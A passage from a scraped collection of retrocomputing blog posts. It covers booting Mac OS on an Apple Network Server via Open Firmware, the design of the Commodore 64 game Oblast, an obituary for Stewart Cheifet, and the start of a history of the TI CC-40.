settings persisted as well.\\nThis means our logic board is likely not at fault, but I do consider this\\nsome\\nsort of bug, especially because I don't want to have to constantly rescue it from a serial port just to restart the operating system. Fortunately there's a tool out there we can repurpose to get around the problem.\\nPaul Mackerras, now working\\nat IBM down under\\nand well-known to us in the OpenPOWER community, years earlier had written a control panel utility called Boot Variables. This CDEV very simply gives you a graphical Mac OS interface to what's stored in Open Firmware. To get this back up I would have had to fix the Mac OS patches, so you can see that the new (tainted) settings are written on startup, not shutdown. This is good news because if we undo the damage beforehand, we'll shutdown and/or reboot normally.\\nBoot Variables lets you save the current contents or load them from a file. If we save the current contents, we can see the NVRAMRC is rather lengthy (extracting the text from the binary dump Boot Variables generates):\\nboot: '&amp; get-token drop ; : &gt;&amp; dup @ 6 &lt;&lt; 6 &gt;&gt;a -4 and + ; : &amp; na+ &gt;&amp; ; 6ED '&amp; execute</p> <p>0 value mi</p> <p>: mmr \" map-range\" mi if my-self $call-method else $call-parent then ; 89B '&amp; ' mmr BRpatch</p> <p>: mcm -1 to mi $call-method 0 to mi ; 8CB '&amp; 1E na+ ' mcm BLpatch</p> <p>: maa -1 to mi 1D swap ; 8C9 '&amp; 5 na+ ' maa BLpatch 8C9 '&amp; 134 + ' 1 BLpatch</p> <p>8CD '&amp; 184 + dup 14 + &gt;&amp; BRpatch</p> <p>8C6 '&amp; 7C + ' u&lt; BLpatch</p> <p>0 value yn : y yn 0= if dup @ to yn then ; 8CB '&amp; ' y BRpatch ' y 28 + 8CB '&amp; 8 + BRpatch : z yn ?dup if over ! 0 to yn then ; 8CC '&amp; ' z BRpatch ' z 2C + 8CC '&amp; 8 + BRpatch\\nThis does a lot of low-level patching, and while it's not exactly clear what part the ANS doesn't like, the script is also rather unnecessary since it boots fine without it.\\nBoot Variables can also write and restart the machine in one step with your new settings. In fact, if you open a Boot Variables dump with the Option key down, it will load those settings and reboot immediately with them, so we can just reboot that way \u2014 not exactly an ideal solution, but it works. Since the source code is available for Boot Variables, I'm tempted to write a Shutdown Items version that will do these steps automagically without prompting. In the meantime you can download it\\nfrom the NetBSD archives\\n, since it has obvious utility for NetBSD/macppc.\\nBecause these steps are a bit of a pain, I suspected (and still do) that the version of Mac OS Apple exhibited during the ANS beta test was likely patched to work around the problem. That's yet to show up, though, if it even exists.\\nThe former Apple employee who got me the 2.26NT ROM also mentioned he'd gotten Rhapsody running on one of their orphaned 700s. This would have had obvious political overtones within Apple at the time, and his boss told him not to tell anybody. Interestingly, the 2.26 ROMs do have strings in them claiming they can boot MacOS:\\n% strings rom1122.bin | grep -i macos [...] driver,AAPL,MacOS,PowerPC MacOS is not supported.  % strings rom226b6.bin | grep -i macos driver,AAPL,MacOS,PowerPC [...] MacOS is not supported.  +MacOS is unsupported, use at your own risk. :MacOS requires PCI video card and external SCSI boot disk. % strings rom226nt.bin | grep -i macos driver,AAPL,MacOS,PowerPC [...] MacOS is not supported.  +MacOS is unsupported, use at your own risk. :MacOS requires PCI video card and external SCSI boot disk.\\nDespite running the system little when (trying to) boot NT, the 2.26NT ROM is of course perfectly capable of running big, and indeed must in order to boot AIX. Those strings appear to be false flags, though, because like the production 1.1.22 ROMs it too is blocked from booting Mac OS at the Open Firmware level:\\ndisk2:aix   can't OPEN: /bandit/53c825@11/sd@2,0:aixOpenFirmware2.26 To continue booting from the default boot device type: BOOT  ok 0 &gt; dev /AAPL,ROM  ok 0 &gt; words  load            open            ok 0 &gt; see open  : open    \"MacOS is not supported. \" type false ; ok 0 &gt; see load  : load    real_base 400000 &lt;&gt; virt_base -800000 &lt;&gt; or real? or little? or if      10 base ! \"FFFFFFFF\" \"real-base\" $setenv \"FFFFFFFF\" \"virt-base\" $setenv      \"false\" \"real-mode?\" $setenv \"false\" \"little-endian?\" $setenv \"boot /AAPL,ROM\"      !set-restart cr \"RESETing to change Configuration!\" type cr reset-all      then    ?cr \"MacOS is unsupported, use at your own risk.\" type ?cr \"MacOS requires PCI video card and external SCSI boot disk.\"    type  ; ok 0 &gt; boot /AAPL,ROM  /AAPL,ROM  MacOS is not supported.  can't OPEN: /AAPL,ROM  ok 0 &gt;\\n... and it will also hang if you patch out the words anyway.\\nNo matter whatever hacking I tried, it would not go past this point either. It\\nis\\nnoteworthy, however, that it claims it would boot with a PCI video card and external disk \u2014 it does\\nnot\\n\u2014 which is exactly our successful configuration for 1.1.20.1. Given these limitations, it seems most likely that our Apple employee did this on a 2.0 ROM system (i.e., the \"real\" ANS Mac OS ROM), but let's see if the pre-production ROMs can pull off the same trick.\\nCurrently I run Mac OS X Server v1.2 (i.e., Rhapsody 5.5) on a WallStreet PowerBook G3, probably the best laptop for doing so, but all versions have been reported to run on beige PCI Power Macs including the 9500. However, my previous experience with Rhapsody was that it rebooted multiple times during the install, and I was concerned this would be a problem with our rickety restart situation. So ... let's have the Wally install it to the BlueSCSI for the 700, and then see if the 700 will boot it.\\nThe Wally is also technically unsupported, but you can get around that in the Installer, and the installation created is universal.\\nThe installation process ran a lot more slowly than Mac OS 9's, even with the Mac OS X Server v1.2 CD images on the BlueSCSI.\\nWhen it completed, I took the finished hard disk and the installer CD disk image back to the 700. The 700 booted the CD just fine \u2014 it's just Mac OS 9, after all \u2014 but its Startup Disk control panel didn't see the Rhapsody disk.\\nI rebooted from the Mac OS 9.1 hard disk image but with the Rhapsody install also present on SCSI ID 1. While both Drive Setup and SCSIProbe saw it, neither mounted it (not even forcibly with SCSIProbe), and Startup Disk still failed to see it.\\nApple made a tool to deal with this and other related startup situations called System Disk. Distinct from the built-in Startup Disk CDEV, this is a utility application that lets you pick your boot volume and as a nice side effect can be used to edit Open Firmware variables too. It comes as a self-mounting disk image.\\nSystem Disk\\nis not supported on some systems\\nand we should not be surprised it is not supported on this one either.\\nThat said, it alone is able to see the Rhapsody volume and can tell us what we need to know. It has the boot and output devices completely wrong \u2014\\nscsi-int\\nwould be the internal SCSI, not the external, and\\n/chaos/control\\nreferences built-in graphics in models like the Power Mac 7300 and 8600 \u2014 and this version of Open Firmware lacks the words\\nO\\nor\\nbootr\\n, but we can see where it expects to load the Mach kernel from (partition 8) using its own \"partition zero\" bootloader.\\nThis information is enough to come up with a command line to try booting it manually, but after all that I couldn't get it to start; it gives the same\\nCLAIM\\nfailure message that's doomed our other attempts. Since I wasn't able to get it any further, it doesn't seem like trying real OS X out would go anywhere either. They may simply not work with this ROM.\\nOverall, however, the machine boots OS 9.1 well enough as long as you deal with the reboot-and-shutdown situation. It's a bit overkill to do this entirely over the external SCSI but at least doing it with flash media is far faster than a regular hard disk or CD-ROM, and as far as size goes I suppose it's no worse than\\nusing an SGI Crimson to browse your filesystem\\n. If this is all you have to boot Mac OS on the ANS, and you really\\nwant\\nto boot Mac OS on the ANS instead of indulging in the jackbooted bliss of AIX, it's perfectly cromulent.\\nThe current situation\\nThe pre-production ROMs work. Still, I'm hoping to get a 2.0 ROM in the near future and working with someone on doing just that. Even so, if you're an Apple employee with one of these ANS ROMs you need to get rid of, let's talk! The 2.0 ROM should solve our remaining issues with Mac OS 9, probably enable us to boot Rhapsody, and possibly even get early versions of Mac OS X working on the Apple Network Server too.\\nSimilarly, if you know anything about \"halbandit\" or can provide the HAL or ARC console for the ANS' spin of Windows NT, that would be great! And anyone with knowledge of how Cyberpunk/NetWare was supposed to boot on Shiner ...\\nIf you'd prefer not to post in the comments or wish to remain publicly anonymous, you can contact me at ckaiser at floodgap dawt com.\\nMore to come\\n."},{"location":"oldvcr.blogspot.com/Oblast-%20a%20better%20Blasto%20game%20for%20the%20Commodore%2064_20260205/","title":"Oblast: a better Blasto game for the Commodore 64\\n\\n\u6765\u6e90: https://oldvcr.blogspot.com\\n\u94fe\u63a5: https://oldvcr.blogspot.com/2025/12/oblast-better-blasto-game-for-commodore.html\\n\u65e5\u671f: 2025-12-06T15:55:00.000-08:00\\n\\n---\\n\\nWay back (well, six months ago, anyway), when I was\\nwiring up a Gremlin Blasto arcade board\\n, we talked at length about this 1978 arcade game's history and its sole official home computer port by Milton Bradley to the Texas Instruments 99/4A. In the single player mode you run around in a maze and try to blow up all the mines, which can set off sometimes impressive chain reactions, all the while making sure you yourself don't go up in flames in the process.\\nThe TI-99/4A version was the Blasto I originally remember playing as I never did play Blasto in the arcades. (Also, for the record, we're not talking about Sony's unrelated Blasto for the PlayStation which, other than having the voice talents of the late and lamented Phil Hartman, was apparently a traumatic slog both for its developers and the few people who actually played it.) To the credit of its three composite authors, it is a competent and accurate conversion that also adds configurable options, colour graphics and music; in fact, TI's Blasto is probably my favourite game on the /4A, more so than any other cartridge. On the other hand,\\nbecause\\nit's an accurate conversion, it also inherits all of the original's weaknesses, which admittedly hail from the limited CPU and ROM capacity of the arcade hardware.\\nSo, in that article, I mentioned two\\nfuture Blasto projects\\n. One is to save my pennies for a custom arcade cabinet to put the board in, though I just spent a cool grand plus on tires which used up a lot of those pennies and I've also got Christmas presents to buy. But the second was to write my own take on TI Blasto and soup it up. This project is the second one\\nfrom my bucket list\\nthat I've completed. It took a couple years of work on it off and on, but it's finally done, with faster action and animation, a massive number of procedurally generated screens, and fully configurable gameplay.\\nI've christened it Oblast, and it's free to play on your real Commodore 64 or emulator. Let's talk about what's the same and what's different.\\nThe antediluvian\\n1978 Blasto\\nran on Hustle hardware, which was derived from Gremlin's original (and mercilessly copied) Blockade game as designed by Lane Hauck. Programmer Bill Blewitt managed to squeeze Blasto's entire game code, not counting character graphics, into just 2K of ROM. This code had to generate and draw the maze, handle one or two player inputs, handle their projectiles, check for collisions and trigger the audio and \"boom\" circuits, all while simultaneously setting off explosions that could trigger other explosions and other collisions. In the upright version it also had free game logic. Given its hardware and software size constraints the arcade game's gameplay limitations, which we'll discuss in a moment, were understandable.\\nWhen Milton Bradley picked up the license (from Gremlin's new owner Sega) as a developer for the new TI 99/4, they kept the gameplay and basic rules in their home computer port almost identical.\\nInstead, the programmers added music tracks, a colour display, and multiple configuration options. You could set not only the game's speed (I always played Full Tilt) ...\\n... but also how the maze was drawn, including whether trails existed (areas of the map pre-cleared for motion) and how dense the mines were.\\nLikely as a way to emphasize the TMS9918(A)'s colour capabilities, the MB programmers changed the setting of the game to a green earth-bound landscape with blue (?) mines and reworked the spaceships into tanks. The density option probably had an even greater impact on gameplay than the speed setting because a maze with a lot of mines made for a zippier, more explosive game. You could rig some big bangs this way, though these were sadly were let down by the TMS9919/SN76489's relatively weak noise output. The program also vainly tried to play a simple tune during the game but this was inevitably interrupted and forced to start over by any sound effect (i.e., a tank shooting, mines exploding).\\nAs with the original, you have infinite lives but finite time. If you trip on an explosion, or the other player shoots you in two-player mode, you lose valuable seconds until you respawn. However, you respawn at your original spawn point as if you were teleported there, a conceivable failure mode for a fanciful spaceship but an extremely unlikely one for a terrestrial tank, which makes a good segue into some of its other idiosyncrasies:\\nEach player can only have a single projectile in motion at any time. However, as soon as that projectile impacts, you can immediately fire another one. This is clearly motivated by the limited memory in the original game, but I don't know of any artillery shell in real life that works like that!\\nAs a related phenomenon, although you can\\nmove\\nwhile an explosion or chain reaction is occurring (with a slight reduction in frame rate), you can't\\nshoot\\n\u2014 at least not until the explosions stop, at which point you can once again shoot immediately. This also seems to be a concession to limited available memory as the game can't track multiple chain reactions at once.\\nTanks absolutely can't go over mines or obstacles; they act as completely impassible barriers. I guess that might make sense with spaceships, but it seems like a rather wussy sort of tank.\\nAlso, there's only one screen. If you shoot all the mines before time runs out, the arcade Blasto would give you a free game in the single player mode, if you were playing on the upright version and if you were in a jurisdiction where free games weren't considered illegal gambling, as they were at the time in some areas (pinball also suffered from this). But that was meaningless on the no-coins-needed TI port, where shooting all the mines would win you a free ... game over screen, the same prize you'd get for losing.\\nNow, I want to point out that despite those things, I loved TI Blasto and played quite a bit of it. But we can improve on what is already an awful lot of fun.\\nIt took a while to get the fundamentals laid down, and it was immediately obvious that the most important mechanic in the game had to be the chain reaction since everybody likes to blow %@#$ up. Consequently, the code that handles the explosions was the first part of the game I wrote, as I reasoned the game wouldn't be worth completing if I couldn't get it fast or frantic enough. This very early draft was a simple proof of concept using PETSCII graphic characters to model the algorithm; character graphics were a must because doing this on the high-resolution screen would have played like molasses.\\nThe game doesn't track explosions anywhere else but the screen itself: everything it needs to determine the next frame of animation is by looking at what's set on the characters present. It scans the entire playfield each time to do this which necessarily locks the animation to a constant frame rate \u2014 even if the whole screen were alive with multiple explosions, it would take nearly exactly as much time as if only one single bomb were being detonated, keeping gameplay speed consistent. I did a lot of code unrolling to make this work as quick as possible and the final draft of the original \"screen test\" is what's in Oblast now.\\nThe black area is because I already knew I'd be using sprites for the tank and I didn't want to mess around with having to manage the high bit for X coordinates greater than 255, so I reserved the right-hand portion of the screen for an information pane. This also had the nice side effect of reducing how much of the screen must be scanned.\\nFor Oblast, I've concentrated exclusively on the single-player mode in which I played Blasto most, which also simultaneously solved some technical issues. (I may make a two-player version in the future if I figure out good solutions to them.) Although I've kept the spirit of TI Blasto's configurability, I made it extend not just to maze generation but even to the game's core rule set. The configuration portion is largely written as a BASIC stub with some 6502 assembly language helpers for speed, with the bulk of the remainder and the entirety of the main game loop also in assembly language.\\nThere are four preset games, the parameters for which I selected after tweaking them during repeated playtesting. The first is the one I consider \"typical\" for most players to start with (and the one you'll see the computer attempt to play during Oblast's attract mode), the second has an increased number of bombs, the third adds trails and more Blasto-like rules for more classic gameplay, and the fourth is a completely gonzo game mode which has become my personal favourite after a rough day at work.\\nIf you don't like those presets, or want to tweak them further, there is a full game configuration screen letting you set game modes and the starting level/screen. The game supports up to 384 procedurally generated screens and you can start on any of them from 0 to 255. The screens are generated from constant seed data (in this case the 64's BASIC ROM) and thus designed to generate the same screen with the same parameters, facilitating muscle memory for longer play if you get good.\\nLike the two versions of Blasto, Oblast has mines (bombs) and obstacles (trees). You can very precisely control the densities of both. You can also have the game generate Blasto-style trails horizontally, vertically or both, you can set how quickly your tank's fuel is exhausted (i.e., your time limit, the only option which cannot be zero), and you can indicate if your tank is invulnerable to explosions and how quickly to cycle your shells. I'll talk about how that works in a moment. If you press one of the preset function keys in the configuration screen, then its settings are loaded as a starting point for you to modify.\\nFor the presets, where a new player wouldn't know exactly the game conditions they trigger, I pondered various in-game ways of informing them and hit on an easy-to-implement \"dot matrix printout\" motif where the BASIC stub scrolls a \"briefing\" before starting play, making asynchronous \"printer\" noises based on the bit pattern of each line's ASCII codes. This same motif is used for the basic built-in help since I had some extra space available.\\nOnce you've got the settings the way you want, or you just want to keep playing the same preset, after a game ends you can bypass the presets and game configuration screens and jump right into a new game with the same settings by pressing the fire button.\\nHere's two examples of the procedural screen generation at work, both level 0. The top screen is what you'd start at if you chose the \"Regular Duty\" (F1) preset; the second is \"More Like Classic Blasto\" (F5). Both have the same seed pointer, and you can see some commonalities in bomb and tree positions, but the second screen has a slightly lower bomb density and a slightly higher tree density plus trails going both horizontally and vertically. Each collection of settings will always generate the same screens on your machine. The game code manually counts the number of bombs and trees at the end of map generation since they may be taken away by trails or in the process of ensuring the tank has a cleared starting position.\\nAlthough we're using a custom character set for speed, I still wanted the colour flexibility of high resolution where you can have different text and background colours. To do so Oblast is something of a love letter to one of the VIC-II's more underutilized display modes, extended background colour mode (ECM). ECM supports up to four background colours on the same screen and the main game uses two additional colours besides the green background, the most obvious being the black background of the information pane, but also a yellow background as part of animating explosions. The price you pay for this flexibility is that only 64 characters of the standard 256-entry character set can be used; the two high bits instead become a bit pair to select the background colour.\\nThat meant making a lot of careful decisions about what I was going to actually display and getting those shapes into the first 64 character glyphs, shown here\\nin Ultrafont+\\n. You'll notice that I've replaced some of the letters and typographic characters with graphic shapes because I knew I would never actually need to display those letters or symbols. Everything you see on the screen except for the tank and the shells is a character in this custom font. On the bright side, this character limit also means we can reduce the memory needed by the game font by 75 percent.\\nBy looking for the bit set for the black background of the (impervious) information pane, as well as the wall character that also has this bit set, the game knows not to propagate explosions into that area. The yellow background comes in for knowing what needs to detonate\\nnext\\nframe: the routine uses that bit as a deferred marker so that as it sweeps sequentially through the screen it doesn't update the same bomb twice in the same frame and prematurely snuff it out. Since setting that bit will also cause a different background colour to be used, we use yellow to make the explosion visually interesting as another side effect.\\nParenthetically, the TMS9918 and TMS9918A also have a feature like this which TI Blasto itself appears to use: each 32 character block of its 256-character fonts can have its own colours. Unlike the VIC-II's ECM which must be specially enabled, this is a standard feature of the 32x24 text mode (which TI calls \"Graphic I\"), but the character shapes remain unchanged in each block which may require making duplicates (whereas with ECM they are always drawn from the first 64 glyphs).\\nIf there are a lot of bombs on screen, as is the case in the fourth preset and my favourite gameplay mode, nearly the entire screen will be consumed with the explosion which animates around you as you shoot other things. This wasn't possible in either of the original Blastos. Also, instead of trying to play music during game play, all three SID voices are used for noise generation (with a low-pass filter and some resonance smeared on for a woofer-like effect). Voice 1 is triggered when you fire your gun and voice 2 is always running as the tank's engine, with its frequency varying with motion and tank rotation. Voice 3 is used specifically for explosions because it's the only SID voice where you can directly sample both the oscillator waveform output and the current amplitude of the audio envelope. We take these samples, scale them to the activity on screen, and feed the result into the VIC-II's screen fine X scroll. Lots of explosions cause lots of shaking, yet the shaking is always in sync with the audio.\\nBesides the character graphics, the other major screen component are the sprites. The tank is a composite of three sprites: an animated set for the tank tread, the main tank body, and an accent layer. This is sharper than using multicolour sprites where your horizontal resolution is halved. These three sprites move together and the build system automatically precalculates frames to rotate them off a template, which are played back on screen when you turn. Unlike both versions of Blasto where the tank is limited to integral character positions, the tank in Oblast is larger than the bombs and trees and can move in single pixels, though I still limited movement to 90 degree angles so I didn't have to do expensive trig computations to figure out a shell's trajectory.\\nOne sprite being used as the fuel gauge needle left four sprites for the shells. I had earlier considered using character graphics for them too, but animating shells that way would be slower and less smooth than moving sprites. On the other hand, then,\\nwithout resorting to tricks\\nthere can only be four shells onscreen at once which also didn't seem very tank-like. After some thought I came up with a game mechanic to explain it. In the information pane in these two shots, you see the level number, the fuel gauge which acts as your timer, and then four blue shell indicators. Three of these indicators are dark blue, indicating they are reloading (the fourth is a bright cyan, indicating ready). We'll simply define the reloading time for any shell chamber as the maximum length of time it takes a shell to get across the screen in any direction. Thus, no matter how much you fire, you can only ever have four on-screen because the reloading time will lock you out. (Blasto-style fire control where shells recycle immediately as they hit something is preserved for that game mode, or if you turn on \"fast cycl[ing] shells\" from the configuration screen.)\\nWhile propagating explosions is approximately constant-time, other operations in the game may not be, and there's no reason to walk the screen if nothing's marked as needing it. That means we need a timebase to keep frame rates stable. For this purpose I used the Kernal jiffy clock, which on both PAL and NTSC systems is triggered by the Timer A interrupt to tick about every 1/60 second. The game loop locks to this and uses it to know when to move game objects and trigger screen updates. Still, even this isn't fast enough for moving very speedy things like the shells you fire and the game felt too slow. So ... we make the Timer A interrupt even faster, flogging it at 240Hz instead of 60Hz (the game has prescaler values for both PAL and NTSC), making jiffies 1/240 of a second instead and moving objects at that rate.\\nThis does have interesting interactions when the VIC-II is still drawing your screen at either 50 or 60Hz even as you update it four times as quickly, and most of these interactions have to do with collisions because you can move objects faster than the VIC-II can detect they intersect. The bombs are as big as they are because that gives lots of opportunities to detect a shell striking one, but tank collisions remained unreliable with smaller graphics like trees. Fortunately, however, we've already declared we didn't like the fact that trees and bombs (i.e., obstacles and mines) were impassible objects, so we can make this deficiency into a virtue. The game keeps running track of\\nwhere the tank last was\\nand if a collision is detected immediately moves it back to that position. However, because collisions are detected inconsistently at this rate of motion and the game updates the tank's coordinates faster than the VIC will draw them, it ends up manifesting onscreen as the tank simply slowing down when it has to cross an obstacle. I like that better than just coming to a dead halt.\\nExplosions, however, are nice big targets and we have no problem detecting when the tank gets nailed by one of those. In the game modes where your tank is vulnerable, we throw your tank into a temporary tailspin, start flashing the border and the information pane (which is just a matter of setting its colour register), turn on voice 1 and voice 3 at the same time for an even bigger boom, and take the envelope and waveform from voice 3 and put it into the fine Y scroll register as well as the X to really throw the screen around. My favourite game mode allows you to blow up the entire playfield with impunity, of course.\\nI also decided to overhaul the scoring with special bonuses silently awarded after completing a screen and detailed cumulatively at the end when your score is added up (total bombs exploded plus total bonuses earned). Don't cheat and look at the source code, but the descriptions of the bonuses should give you a clue as to how you win them. Note that some bonuses are mutually exclusive, and some are explicitly disabled (\"n/a\") in certain game configurations that make them impossible or unavoidable.\\nShould you beat the default high score, you'll see another use of extended background colour mode for the champion medal (you'll just have to beat it fair and square, no spoiler screenshots). This segment\\nuses FLD\\nto scroll the medal into view and then cycles the ECM registers for a masked multiple colour bar effect without having to split the screen horizontally. It's a simple effect that I threw together in an afternoon but I think it looks nice. While the game configuration screen\\nlooks\\nlike it might use ECM for the top title, it actually doesn't because I needed lowercase letters, so I employ a much simpler trick for that screen which shouldn't take you long to figure out.\\nA key goal was to get the entire game in memory at once without additional loading or disk access, meaning you can even run it from cassette tape if you want to. In memory everything is arranged around the two character sets, the bank of sprites and the two hi-res title screens which are in fixed locations to deal with the VIC-II's more constrained view of memory (one of the hi-res screens is slotted under the BASIC ROM so I could free up 8K for something else). I then redistributed the various machine language subroutines and the three music tracks around those assets while also ensuring the BASIC menu stub had enough free memory to maintain its variables. After the core game was done I added two more extras on, the attract mode (which required some reworking to fit) and a really silly credits sequence, which implements a double-buffered screen scroller and takes advantage of the fact that the main music track sounds pretty neat slowed down. The entire mess is then single-parted using my custom cross-linker and optionally compressed.\\nOblast is\\nfreeware and open source on Github\\n. You can build it with Perl 5, the\\nxa65\\ncross assembler\\nand optionally the\\npucrunch\\ncompressor\\n. The Perl tools to generate the sprites, the tokenized BASIC code and the uncompressed runnable linked version are all included. Say that you want to change the presets to your own preferred settings: just change the corresponding\\nDATA\\nstatement in the BASIC code, do a\\nmake\\nand instantly have your modified binary. All I ask is that modified binaries that you provide to others should use a different name so they aren't confused with the original, and note that this game and any derivative works based on it or its components are under the\\nFloodgap Free Software License\\n.\\nIf you just want to play it,\\nthe Github releases tab\\nprovides compressed (for actual floppy disks or tape or other media with limited space) and uncompressed (for fast DMA cartridges and emulators) builds as\\n.prg\\nfiles you can run directly. You'll need a joystick or equivalent in port 2, and the game should run on any PAL or NTSC Commodore 64. This is hardly the last game, let alone project, on\\nmy bucketlist\\n, but it's good to knock another one off it. Also, please don't blow up trees in real life.\\nIf you've enjoyed playing,\\nbuy me a\\ncoffee\\nPibb\\n.","text":""},{"location":"oldvcr.blogspot.com/Stewart%20Cheifet%20has%20died_20260205/","title":"Stewart Cheifet has died\\n\\n\u6765\u6e90: https://oldvcr.blogspot.com\\n\u94fe\u63a5: https://oldvcr.blogspot.com/2025/12/stewart-cheifet-has-died.html\\n\u65e5\u671f: 2025-12-31T12:26:00.000-08:00\\n\\n---\\n\\nVery sorry to hear about\\nthe death of Stewart Cheifet\\nat 87, long-time host of Computer Chronicles, which for a long time was the undisputed best show on computers on American public broadcasting. I watched it on PBS TV as a kid, and candidly I didn't understand much of what was going on at the time, but I learned a lot and rewatching the episodes now really demonstrates what a treasure trove of pithy information and industry commentary they were. Gary Kildall, of Digital Research fame, was his co-host in many 1980s episodes and the most notable of an august crew that also included George Morrow and Paul Schindler, but Cheifet was the linchpin and carried the show on his formidable shoulders from its 1984 start until the final episode in 2002. The most amazing part of his work, however, is what happened after: the vast majority of the program is\\npreserved for posterity at the Internet Archive\\n, not just with his blessing, but with his active participation. For any computer historian and student of the early industry, the show is not to be missed. Rest in peace.","text":""},{"location":"oldvcr.blogspot.com/The%20Texas%20Instruments%20CC-40%20invades%20Gopherspace%20%28plus%20TI-74%20BASICALC%29_20260205/","title":"The Texas Instruments CC-40 invades Gopherspace (plus TI-74 BASICALC)\\n\\n\u6765\u6e90: https://oldvcr.blogspot.com\\n\u94fe\u63a5: https://oldvcr.blogspot.com/2025/12/the-texas-instruments-cc-40-invades.html\\n\u65e5\u671f: 2025-12-20T20:04:00.000-08:00\\n\\n---\\n\\nI've mentioned on the blog several times\\nthe continuum that exists between handheld computers and pocket computers\\n, battery powered devices in rather small form factors that are nevertheless fully-fledged general purpose computers \u2014 arguably more so than the modern locked-down smartphone has become. Some of these diminutive systems are best considered \"handhelds,\" with larger size, larger keyboards, more power and (often) less battery life, and some are definitely \"pocket computers,\" with smaller size, smaller keys, less power and (usually) better battery life. For example, systems like the Tandy PC-4/Casio PB-100 or Tandy PC-3/Sharp PC-1250 would be considered \"definitely a pocket computer,\" while the Epson HX-20 or Kyotronic 85 systems like the NEC PC-8201A or TRS-80 Model 100 would be considered \"definitely a handheld computer,\" and you can probably think up some examples in between.\\nWell, here's a notable example of one single architecture that birthed\\nboth\\ntypes of machine, and it came from a company not really noted for either one: Texas Instruments.\\nTI certainly made calculators and many of those were programmable by some means, but neither handheld computers nor pocket computers had categorically been in their repertoire to date. Nevertheless, here we have the 1983 Compact Computer 40 \u2014 using the AA battery for scale, at that size\\ndefinitely\\na handheld \u2014 and above it the 1985 TI-74 BASICALC, notionally a \"BASIC programmable calculator,\" but actually an evolved version of nearly the same hardware in less than half the size. Thanks to the ingenuity of the Hexbus interface, which due to TI's shortsightedness was never effectively exploited during that era, we can get a serial port running on both of these with hobbyist hardware. If we have a serial port, that means we can bring up a terminal program \u2014 which we'll write from scratch in assembly language for shell and Gopherspace access.\\nBut how would a Unix shell work on a single line screen, or for that matter, a Gopher menu? We'll explore some concepts, but before we do that, for context and understanding of their capabilities we'll start with the history of these machines \u2014 and because their development is unavoidably tangled with TI's other consumer products and their home computer family, we'll necessarily rehash some of those highlights and nadirs as well.\\nThe Compact Computer family and the CC-40\\nThe obvious progenitors of the pocket-handheld computer family were the programmable calculators emerging from various manufacturers in the mid-1970s. In this genre TI was a notable vendor despite being just one of several. Arguably the first of these was the\\nHewlett-Packard HP-65\\n, released in 1974. Although not a computer in the conventional sense (despite HP's marketing), it could accept up to 100 lines of \"program text\" (key presses) and read and write them using magnetic stripe cards, and was robust enough to go into space with the Apollo mission in 1975. TI fired back in 1975 with the SR-52, also programmable with mag stripe, and supporting 224 lines.\\nHP, TI and Casio became probably the most active in this submarket, culminating in the 1977 TI-58 and TI-59 supporting up to 5000 lines of program text stored in \"solid state\" ROM modules that acted like library cartridges (the ad here is from a 1979 promotion). These modules became very popular for vertical markets, with bespoke program functions stored ready-to-go for industries like insurance and finance and engineering not unlike\\nthe later Panasonic HHC\\n. Having knocked other smaller companies like Commodore out of contention, TI understood HP to be their most direct competitor at that time, and launched what was called\\nProject X\\nin 1977 to leapfrog them in the programmable calculator segment: wider screens up to 16 characters wide, expandable memory and an \"Equation Operating System\" implementing a scrolling display for formula entry and editing, facilitated using a new system architecture tentatively named \"LCD III.\"\\nAs competing calculators added power and new capabilities, a higher end model dubbed the Advanced Language Calculator (or ALC for short, codenamed \"Lonestar\") sought to introduce more computer-like features to the handheld range with its own scrolling LCD and cartridge-based software and programming languages. The idea turned out to be an atypically forward-thinking move on TI's part because the market dramatically changed in 1980 when Sharp introduced the PC-1210 and PC-1211, the first true pocket computers with full alphanumerics and programmability in BASIC (the PC-1211 was rebadged by Tandy Radio Shack\\nas the PC-1\\n). In quick succession followed\\nthe Panasonic HHC family\\n, even based on a more conventional architecture, the 6502, and shortly afterwards Casio introduced their own pocket line.\\nThis new offshoot of the calculator market caused TI management to reexamine how Project X and the ALC should be positioned. Commissioning a user survey in July 1981, TI's marketing team broadened both concepts into three potential niches (RM 1000, RM 2000 and RM 3000), reworking the original programmable calculator product into the lowest price point (1000) while adding a BASIC-based single-line LCD pocket computer (2000) and a full multi-line LCD portable as higher tiers (3000). The obvious inheritor of Project X, the RM 1000 eventually morphed into the still-born TI-88 calculator, produced and prototyped but unexpectedly cancelled pre-launch in 1982 due to fears it was already obsolete.\\nThe RM 2000, on the other hand, wasn't an exact physical match for the ALC/Lonestar, which by then was a larger handheld with a 31-character LCD and \"Chiclet\" style keyboard, but Lonestar was sufficiently far along in development that its present form factor won out. (The scan above of an undated ALC mockup came from a bad photocopy tucked in with one of my CC-40s which I have tried to airbrush and clean up for legibility. I don't know anything about its provenance otherwise.) Additional market separation was achieved by using a new 8-bit processor design, admittedly with less capability than their flagship 16-bit 9900/9995 CPUs and microcontroller variants, but also without their legacy baggage. Implementing an internal architecture not unlike the Intel 8051, with which it was intended to be comparable, the TMS7000 series was also positioned as a follow-on to their very successful\\n4-bit TMS1000 family\\nin that custom microcode was fully supported like the earlier product. Like most microcontrollers, it could be shipped with built-in mask ROM directly from manufacture. TI started selling NMOS variants of the chip family in 1981, but the then-current version of the chip required two nine-volt batteries in the Lonestar prototype to power it and engineers proceeded converting the chip family to low-power CMOS for the ALC.\\nIn parallel, the Texas Instruments consumer products division was determined to maximize sales volume, initially through discounts, reductions in production cost and heavily courting retailers, and in September 1982 newly promoted division head William Turner openly ignited a home computer price war with Jack Tramiel's resurgent Commodore. Turner aimed to push Commodore out of the market again by competing on price, now Tramiel's home turf, and use the installed base to move their vendor-locked software and peripherals. While TI sales duly increased, Commodore persistently hung on in the low end market as in retrospect the VIC-20 was a much cheaper system against which the expensive and arguably overengineered TI 99/4A could not indefinitely compete. Nevertheless, through the rest of 1982 the 99/4A outsold the VIC-20 and for some period of time was the number one home computer in the United States, and management rapidly plotted how to diversify the line. Alongside wilder ideas like the 99/7 terminal and a direct successor alternately referred to as the 99/4B or 99/5, at least two concepts got as far as actual hardware. The 99/8 (codenamed \"Armadillo\") was intended to attack the high side of the market, a substantial expansion of the 99/4A with more RAM and built-in Extended BASIC, while the 99/2 was meant to hit the ultra-low end as a direct response to systems like the UK Sinclair ZX81 (subsequently introduced States-side in slightly modified form as the Timex Sinclair 1000). Although also a full 16-bit member of the 9900 family \u2014 with a TMS9995 CPU, the same as the\\nTomy Tutor\\n\u2014 the diminutive 99/2 used a Chiclet style keyboard similar to Lonestar and a very limited black-and-white video chip, less capable than the 9918A but also less expensive. It supported cassette tape and cartridges, and as a stepping stone to the larger systems, BASIC programs written on a 99/2 were designed to be upwardly compatible with the 